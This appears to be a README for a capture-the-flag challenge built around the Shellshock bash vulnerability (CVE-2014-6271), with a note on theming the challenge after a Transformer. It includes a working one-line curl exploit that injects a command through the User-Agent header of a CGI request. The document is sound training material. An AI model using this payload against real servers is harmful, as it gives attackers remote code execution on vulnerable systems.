# shellshock

Based on CVE-2014-6271

This docker container is running an apache2 webserver which competitors will have access to. The webserver doesn't hold the exploit, but rather enables competitors to leverage a vulnerable version of bash (4.2) via a cgi script to gain RCE.

Bash 4.2 is compiled from source: https://ftp.gnu.org/gnu/bash/

One line solution: `curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'echo MY_FLAG > /flags/flag.txt'" http://<address>/cgi-bin/vulnerable`

As for themeing, there is a Transformer named Shellshock: https://tfwiki.net/wiki/Shellshock. We can rename the challenge but have the initial webpage or CTFd show this as a hint?